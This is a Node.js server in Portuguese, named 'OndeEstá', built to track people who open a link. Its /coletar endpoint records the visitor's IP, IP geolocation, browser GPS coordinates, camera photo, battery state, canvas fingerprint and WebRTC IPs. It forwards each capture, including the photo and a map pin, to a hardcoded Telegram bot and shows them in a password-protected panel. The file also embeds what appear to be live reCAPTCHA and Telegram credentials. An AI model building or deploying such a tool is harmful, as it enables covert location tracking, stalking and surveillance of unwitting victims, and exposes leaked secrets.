const http = require("http");
const https = require("https");
const fs = require("fs");
const path = require("path");

const PORTA = process.env.PORT || 3000;
const SENHA_PAINEL = process.env.SENHA || "mude-esta-senha";
const RECAPTCHA_SECRET = process.env.RECAPTCHA_SECRET || "6LfBYv0tAAAAAFteVqaIG71qdAuuQe_3NfgVTQ36";
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8719492094:AAEXTpP11onIaztBFEKhNNbGxHOpjsGHTds";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "5409085646";
const ARQUIVO_LOGS = path.join(__dirname, "logs.json");
const PASTA_FOTOS = path.join(__dirname, "fotos");

if (!fs.existsSync(PASTA_FOTOS)) fs.mkdirSync(PASTA_FOTOS, { recursive: true });

function lerLogs() {
  try { return JSON.parse(fs.readFileSync(ARQUIVO_LOGS, "utf8")); }
  catch { return []; }
}
function salvarLogs(logs) { fs.writeFileSync(ARQUIVO_LOGS, JSON.stringify(logs, null, 2)); }
function salvarLog(registro) {
  const logs = lerLogs();
  registro.id = Date.now() + "_" + Math.random().toString(36).slice(2, 8);
  logs.unshift(registro);
  salvarLogs(logs);
}

function pegarIp(req) {
  const xff = req.headers["x-forwarded-for"];
  if (xff) return xff.split(",")[0].trim();
  return (req.socket.remoteAddress || "").replace("::ffff:", "");
}

async function geolocalizarIp(ip) {
  if (!ip || ip.startsWith("127.") || ip === "::1" || ip.startsWith("192.168.") || ip.startsWith("10."))
    return { aviso: "IP local/privado (teste na rede local)" };
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query&lang=pt-BR`
    );
    const d = await r.json();
    if (d.status !== "success") return { aviso: "Não foi possível localizar o IP" };
    return {
      pais: d.country, estado: d.regionName, cidade: d.city, cep: d.zip,
      latitude_aprox: d.lat, longitude_aprox: d.lon, provedor: d.isp,
      organizacao: d.org, rede_as: d.as, e_celular: d.mobile,
      e_proxy_vpn: d.proxy, e_hospedagem: d.hosting,
    };
  } catch { return { aviso: "Falha ao geolocalizar IP" }; }
}

function salvarFoto(base64) {
  if (!base64 || typeof base64 !== "string" || !base64.startsWith("data:image")) return null;
  const id = Date.now() + "_" + Math.random().toString(36).slice(2, 8);
  const nome = id + ".jpg";
  const dados = base64.replace(/^data:image\/\w+;base64,/, "");
  fs.writeFileSync(path.join(PASTA_FOTOS, nome), Buffer.from(dados, "base64"));
  return nome;
}

function lerCorpo(req, limite) {
  return new Promise((resolve) => {
    let corpo = "", tam = 0;
    req.on("data", (c) => { tam += c.length; if (tam > limite) { req.destroy(); return; } corpo += c; });
    req.on("end", () => resolve(corpo));
  });
}

function verificarSenha(url) { return url.searchParams.get("senha") === SENHA_PAINEL; }

// ── Verificar reCAPTCHA ──
async function verificarRecaptcha(token) {
  if (!RECAPTCHA_SECRET || !token) return false;
  try {
    const params = `secret=${encodeURIComponent(RECAPTCHA_SECRET)}&response=${encodeURIComponent(token)}`;
    const r = await fetch("https://www.google.com/recaptcha/api/siteverify", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params,
    });
    const d = await r.json();
    return d.success === true;
  } catch { return false; }
}

// ── Notificação Telegram ──
async function notificarTelegram(registro) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
  const g = registro.geo_por_ip || {};
  const p = registro.localizacao_precisa;
  const temGps = p && typeof p === "object" && p.latitude != null;

  const ua = registro.user_agent || "";
  let disp = "Desconhecido";
  if (ua.includes("iPhone")) disp = "iPhone";
  else if (ua.includes("Android")) disp = "Android";
  else if (ua.includes("Windows")) disp = "Windows";
  else if (ua.includes("Mac")) disp = "Mac";
  else if (ua.includes("Linux")) disp = "Linux";

  let msg = `🚨 *NOVO ACESSO*\n\n`;
  msg += `📅 ${registro.data}\n`;
  msg += `📱 ${disp}\n`;
  msg += `🌐 IP: \`${registro.ip}\`\n`;

  if (g.cidade) msg += `📌 ${g.cidade}, ${g.estado} - ${g.pais}\n`;
  if (g.provedor) msg += `🏢 ${g.provedor}\n`;
  if (g.e_proxy_vpn) msg += `⚠️ *Usando VPN/Proxy*\n`;
  if (g.e_celular) msg += `📶 Rede móvel\n`;

  if (temGps) {
    msg += `\n✅ *GPS PRECISO* (±${p.precisao_metros || "?"}m)\n`;
    msg += `📍 [Abrir no Maps](https://www.google.com/maps/search/?api=1&query=${p.latitude},${p.longitude})\n`;
  } else {
    msg += `\n❌ GPS não autorizado\n`;
    if (g.latitude_aprox != null) {
      msg += `📍 [Local aproximado (IP)](https://www.google.com/maps/search/?api=1&query=${g.latitude_aprox},${g.longitude_aprox})\n`;
    }
  }

  const bat = registro.bateria;
  if (bat && typeof bat === "object") msg += `🔋 ${bat.nivel} ${bat.carregando ? "⚡" : ""}\n`;

  msg += `\n🖥️ ${registro.aparelho?.tela || ""} | ${registro.aparelho?.fuso_horario || ""}`;

  if (registro.foto && registro.foto !== "não autorizada") msg += `\n📸 Foto capturada`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: msg,
        parse_mode: "Markdown",
        disable_web_page_preview: true,
      }),
    });

    // Envia a foto separada se existir
    if (registro.foto && registro.foto !== "não autorizada") {
      const caminhoFoto = path.join(PASTA_FOTOS, registro.foto);
      if (fs.existsSync(caminhoFoto)) {
        const boundary = "----TelegramBoundary" + Date.now();
        const fotoBuffer = fs.readFileSync(caminhoFoto);
        const partes = [
          `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`,
          `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n📸 Foto - ${registro.ip} - ${registro.data}\r\n`,
          `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="foto.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`,
        ];
        const inicio = Buffer.from(partes.join(""));
        const fim = Buffer.from(`\r\n--${boundary}--\r\n`);
        const body = Buffer.concat([inicio, fotoBuffer, fim]);

        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
          method: "POST",
          headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
          body: body,
        });
      }
    }

    // Envia localização GPS como pin no mapa
    if (temGps) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          latitude: p.latitude,
          longitude: p.longitude,
        }),
      });
    }
  } catch(e) { console.error("Erro Telegram:", e.message); }
}

// ── Painel HTML ──
function gerarPainel(logs) {
  const total = logs.length;
  const comGps = logs.filter(l => l.localizacao_precisa && typeof l.localizacao_precisa === "object").length;
  const comFoto = logs.filter(l => l.foto && l.foto !== "não autorizada").length;
  const ipsUnicos = new Set(logs.map(l => l.ip)).size;

  const linhas = logs.map((l) => {
    const g = l.geo_por_ip || {};
    const p = l.localizacao_precisa;
    const temGps = p && typeof p === "object" && p.latitude != null;
    const ap = l.aparelho || {};
    const fp = l.fingerprint || {};

    let localHtml = "";
    if (temGps) localHtml += `<a href="https://www.google.com/maps/search/?api=1&query=${p.latitude},${p.longitude}" target="_blank" class="btn-mapa gps">📍 GPS PRECISO (±${p.precisao_metros||"?"}m)</a>`;
    if (g.latitude_aprox != null) localHtml += `<a href="https://www.google.com/maps/search/?api=1&query=${g.latitude_aprox},${g.longitude_aprox}" target="_blank" class="btn-mapa aprox">📍 Aproximado (IP)</a>`;
    if (!localHtml) localHtml = `<span class="sem-dado">Sem coordenadas</span>`;

    const fotoHtml = l.foto && l.foto !== "não autorizada"
      ? `<img src="/fotos/${l.foto}" class="foto" onclick="this.classList.toggle('exp')">`
      : `<span class="sem-dado">Sem foto</span>`;

    const ua = l.user_agent || "";
    let disp = "?";
    if (ua.includes("iPhone")) disp = "iPhone";
    else if (ua.includes("Android")) disp = "Android";
    else if (ua.includes("Windows")) disp = "Windows";
    else if (ua.includes("Mac")) disp = "Mac";
    else if (ua.includes("Linux")) disp = "Linux";

    const tags = [
      `<span class="tag disp">${disp}</span>`,
      g.e_proxy_vpn ? `<span class="tag warn">⚠️ VPN</span>` : "",
      g.e_celular ? `<span class="tag">📱 Móvel</span>` : "",
      g.e_hospedagem ? `<span class="tag warn">🖥️ DC</span>` : "",
      l.bateria && typeof l.bateria === "object" ? `<span class="tag">🔋 ${l.bateria.nivel}${l.bateria.carregando ? "⚡" : ""}</span>` : "",
      ap.conexao ? `<span class="tag">📶 ${ap.conexao}</span>` : "",
      l.recaptcha_valido ? `<span class="tag ok">✅ Captcha</span>` : `<span class="tag warn">❌ Captcha</span>`,
    ].filter(Boolean).join("");

    const webrtc = fp.webrtc_ips && fp.webrtc_ips.length
      ? `<span class="tag">🔗 ${fp.webrtc_ips.join(", ")}</span>` : "";

    const logLimpo = Object.assign({}, l);
    if (logLimpo.foto && logLimpo.foto !== "não autorizada") logLimpo.foto = "[" + logLimpo.foto + "]";
    delete logLimpo.recaptcha_token;

    return `<article class="item" data-id="${l.id}">
      <div class="hdr">
        <div><strong>${l.data}</strong> <span class="ip">${l.ip}</span> ${tags}</div>
        <button class="del" onclick="excluir('${l.id}')">🗑️</button>
      </div>
      <div class="loc">
        ${g.cidade ? `<div class="loc-t">📌 ${g.cidade}, ${g.estado} - ${g.pais}</div>` : ""}
        ${g.provedor ? `<div class="loc-p">🌐 ${g.provedor}</div>` : ""}
        <div class="mapas">${localHtml}</div>
      </div>
      <div class="foto-area">${fotoHtml}</div>
      <div class="tags">
        ${ap.tela ? `<span class="tag">🖥️ ${ap.tela}</span>` : ""}
        ${ap.gpu && ap.gpu !== "N/A" ? `<span class="tag">🎮 ${ap.gpu}</span>` : ""}
        ${ap.fuso_horario ? `<span class="tag">🕐 ${ap.fuso_horario}</span>` : ""}
        ${webrtc}
        ${fp.canvas ? `<span class="tag">🔑 FP:${fp.canvas.slice(0,12)}</span>` : ""}
        ${l.sessao?.tempo_na_pagina_ms ? `<span class="tag">⏱️ ${Math.round(l.sessao.tempo_na_pagina_ms/1000)}s</span>` : ""}
      </div>
      <details><summary>JSON</summary><pre>${JSON.stringify(logLimpo, null, 2)}</pre></details>
    </article>`;
  }).join("");

  return `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Painel - OndeEstá</title>
<style>
:root{--bg:#0f1117;--card:#1a1d27;--brd:#2a2d3a;--txt:#e4e4e7;--mut:#888;--acc:#3b82f6;--red:#ef4444;--grn:#22c55e}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:var(--bg);color:var(--txt);max-width:900px;margin:0 auto;padding:1rem}
h1{font-size:1.3rem;margin-bottom:.3rem}
.topo{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.8rem;margin-bottom:1rem}
.stats{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:1rem}
.st{background:var(--card);border:1px solid var(--brd);border-radius:10px;padding:.5rem .8rem;text-align:center;min-width:80px;flex:1}
.st b{display:block;font-size:1.4rem;color:var(--acc)} .st small{font-size:.65rem;color:var(--mut);text-transform:uppercase;letter-spacing:.5px}
.acoes{display:flex;gap:.5rem;flex-wrap:wrap;align-items:center}
.btn{border:none;border-radius:8px;padding:.45rem .9rem;font-size:.82rem;cursor:pointer;font-weight:500}
.btn:hover{opacity:.85} .btn-r{background:var(--red);color:#fff} .btn-a{background:var(--acc);color:#fff}
input[type=text]{background:var(--card);border:1px solid var(--brd);color:var(--txt);border-radius:8px;padding:.45rem .7rem;font-size:.82rem;width:180px}
input::placeholder{color:var(--mut)}
.item{background:var(--card);border:1px solid var(--brd);border-radius:12px;padding:1rem;margin:.7rem 0;transition:border-color .2s}
.item:hover{border-color:var(--acc)} .item.sel{border-color:var(--red);background:#1f1215}
.hdr{display:flex;justify-content:space-between;align-items:flex-start;gap:.5rem;flex-wrap:wrap;margin-bottom:.4rem}
.hdr strong{font-size:.9rem}
.ip{background:#2563eb22;color:var(--acc);padding:.1rem .4rem;border-radius:4px;font-size:.75rem;font-family:monospace;margin-left:.2rem}
.del{background:none;border:1px solid var(--brd);border-radius:6px;color:var(--mut);cursor:pointer;padding:.25rem .4rem;font-size:.8rem;transition:all .2s;flex-shrink:0}
.del:hover{border-color:var(--red);color:var(--red)}
.tag{display:inline-block;background:#ffffff0a;border:1px solid var(--brd);padding:.12rem .4rem;border-radius:4px;font-size:.7rem;margin:.1rem .15rem .1rem 0}
.tag.warn{border-color:#f59e0b55;color:#fbbf24} .tag.disp{border-color:#8b5cf655;color:#a78bfa} .tag.ok{border-color:#22c55e55;color:#22c55e}
.loc{margin:.4rem 0} .loc-t{font-size:.88rem;font-weight:500;margin-bottom:.15rem} .loc-p{font-size:.78rem;color:var(--mut);margin-bottom:.3rem}
.mapas{display:flex;flex-wrap:wrap;gap:.3rem}
.btn-mapa{display:inline-block;padding:.35rem .6rem;border-radius:6px;text-decoration:none;font-size:.78rem;font-weight:500}
.btn-mapa:hover{opacity:.85} .btn-mapa.gps{background:var(--grn);color:#fff} .btn-mapa.aprox{background:var(--acc);color:#fff}
.sem-dado{color:var(--mut);font-size:.78rem;font-style:italic}
.foto-area{margin:.4rem 0}
.foto{max-width:110px;border-radius:8px;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,.3);transition:max-width .3s}
.foto.exp{max-width:100%}
.tags{margin:.3rem 0}
details{margin-top:.4rem} details summary{cursor:pointer;color:var(--acc);font-size:.78rem}
pre{background:#0d0f14;padding:.6rem;overflow:auto;border-radius:6px;font-size:.68rem;margin-top:.3rem;color:#aaa;border:1px solid var(--brd)}
.vazio{text-align:center;padding:2rem;color:var(--mut)}
.sbar{display:none;position:fixed;bottom:0;left:0;right:0;background:#1a1d27ee;backdrop-filter:blur(8px);border-top:1px solid var(--brd);padding:.7rem;z-index:10}
.sbar.on{display:flex;justify-content:center;align-items:center;gap:1rem}
@media(max-width:600px){.st{min-width:60px;padding:.4rem .4rem} .st b{font-size:1rem} input[type=text]{width:100%}}
</style></head><body>
<div class="topo">
  <div><h1>📋 OndeEstá</h1><span style="color:var(--mut);font-size:.75rem">${total} registro${total!==1?"s":""}</span></div>
  <div class="acoes">
    <input type="text" id="q" placeholder="Filtrar..." oninput="filtrar()">
    <button class="btn btn-a" onclick="toggleSel()">☑️ Selecionar</button>
    <button class="btn btn-r" onclick="limparTudo()">🗑️ Tudo</button>
  </div>
</div>
<div class="stats">
  <div class="st"><b>${total}</b><small>Acessos</small></div>
  <div class="st"><b>${ipsUnicos}</b><small>IPs</small></div>
  <div class="st"><b>${comGps}</b><small>GPS</small></div>
  <div class="st"><b>${comFoto}</b><small>Fotos</small></div>
</div>
<div id="lista">${linhas||'<div class="vazio">Nenhum acesso ainda.</div>'}</div>
<div id="sbar" class="sbar"><span id="sc">0</span>
  <button class="btn btn-r" onclick="excluirSel()">🗑️ Excluir</button>
  <button class="btn" style="background:var(--brd);color:var(--txt)" onclick="cancelSel()">Cancelar</button>
</div>
<script>
var S=new URLSearchParams(location.search).get("senha"),sel=new Set,modo=false;
function filtrar(){var t=document.getElementById("q").value.toLowerCase();document.querySelectorAll(".item").forEach(function(e){e.style.display=e.textContent.toLowerCase().includes(t)?"":"none"})}
function toggleSel(){modo=!modo;sel.clear();updBar();document.querySelectorAll(".item").forEach(function(e){e.classList.remove("sel");if(modo){e.style.cursor="pointer";e.onclick=function(){var i=e.dataset.id;sel.has(i)?(sel.delete(i),e.classList.remove("sel")):(sel.add(i),e.classList.add("sel"));updBar()}}else{e.style.cursor="";e.onclick=null}})}
function updBar(){var b=document.getElementById("sbar");if(modo){b.classList.add("on");document.getElementById("sc").textContent=sel.size+" selecionado"+(sel.size!==1?"s":"")}else b.classList.remove("on")}
function cancelSel(){modo=false;sel.clear();document.querySelectorAll(".item").forEach(function(e){e.classList.remove("sel");e.style.cursor="";e.onclick=null});updBar()}
function excluir(id){if(!confirm("Excluir?"))return;fetch("/painel/excluir?senha="+S,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({ids:[id]})}).then(function(){location.reload()})}
function excluirSel(){if(!sel.size)return;if(!confirm("Excluir "+sel.size+"?"))return;fetch("/painel/excluir?senha="+S,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({ids:Array.from(sel)})}).then(function(){location.reload()})}
function limparTudo(){if(!confirm("EXCLUIR TUDO?"))return;fetch("/painel/excluir-todos?senha="+S,{method:"POST"}).then(function(){location.reload()})}
</script></body></html>`;
}

// ── Servidor ──
const servidor = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  if (req.method === "GET" && url.pathname === "/") {
    try {
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(fs.readFileSync(path.join(__dirname, "public", "index.html")));
    } catch { res.writeHead(500); res.end("Erro"); }
    return;
  }

  if (req.method === "GET" && url.pathname.startsWith("/fotos/")) {
    const nome = path.basename(url.pathname);
    try {
      res.writeHead(200, { "Content-Type": "image/jpeg", "Cache-Control": "public, max-age=86400" });
      res.end(fs.readFileSync(path.join(PASTA_FOTOS, nome)));
    } catch { res.writeHead(404); res.end("Não encontrada"); }
    return;
  }

  if (req.method === "POST" && url.pathname === "/coletar") {
    const corpo = await lerCorpo(req, 10 * 1024 * 1024);
    let cliente = {};
    try { cliente = JSON.parse(corpo); } catch {}
    const ip = pegarIp(req);
    const captchaOk = await verificarRecaptcha(cliente.recaptcha_token);
    const arquivoFoto = salvarFoto(cliente.foto);
    const registro = {
      data: new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
      ip,
      geo_por_ip: await geolocalizarIp(ip),
      user_agent: req.headers["user-agent"] || "",
      idioma: req.headers["accept-language"] || "",
      referer: req.headers["referer"] || "",
      aparelho: cliente.aparelho || {},
      bateria: cliente.bateria || "N/A",
      localizacao_precisa: cliente.gps || "não autorizada",
      foto: arquivoFoto || "não autorizada",
      fingerprint: cliente.fingerprint || {},
      sessao: cliente.sessao || {},
      recaptcha_valido: captchaOk,
    };
    salvarLog(registro);
    notificarTelegram(registro).catch(() => {});
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  if (req.method === "GET" && url.pathname === "/painel") {
    if (!verificarSenha(url)) {
      res.writeHead(401, { "Content-Type": "text/html; charset=utf-8" });
      res.end("<h3>Senha incorreta.</h3><p>Use /painel?senha=SUA_SENHA</p>");
      return;
    }
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(gerarPainel(lerLogs()));
    return;
  }

  if (req.method === "POST" && url.pathname === "/painel/excluir") {
    if (!verificarSenha(url)) { res.writeHead(401); res.end("{}"); return; }
    const corpo = await lerCorpo(req, 1024 * 1024);
    let dados = {};
    try { dados = JSON.parse(corpo); } catch {}
    const ids = new Set(dados.ids || []);
    if (!ids.size) { res.writeHead(400); res.end("{}"); return; }
    let logs = lerLogs();
    logs.filter(l => ids.has(l.id)).forEach(l => {
      if (l.foto && l.foto !== "não autorizada")
        try { fs.unlinkSync(path.join(PASTA_FOTOS, l.foto)); } catch {}
    });
    logs = logs.filter(l => !ids.has(l.id));
    salvarLogs(logs);
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  if (req.method === "POST" && url.pathname === "/painel/excluir-todos") {
    if (!verificarSenha(url)) { res.writeHead(401); res.end("{}"); return; }
    lerLogs().forEach(l => {
      if (l.foto && l.foto !== "não autorizada")
        try { fs.unlinkSync(path.join(PASTA_FOTOS, l.foto)); } catch {}
    });
    salvarLogs([]);
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  if (url.pathname === "/favicon.ico") { res.writeHead(204); res.end(); return; }
  res.writeHead(404); res.end("Não encontrado");
});

servidor.listen(PORTA, "0.0.0.0", () => {
  console.log(`\n  Página:  http://localhost:${PORTA}/`);
  console.log(`  Painel:  http://localhost:${PORTA}/painel?senha=${SENHA_PAINEL}`);
  if (TELEGRAM_TOKEN) console.log(`  Telegram: ativo`);
  else console.log(`  Telegram: desativado (defina TELEGRAM_TOKEN e TELEGRAM_CHAT_ID)`);
  console.log();
});
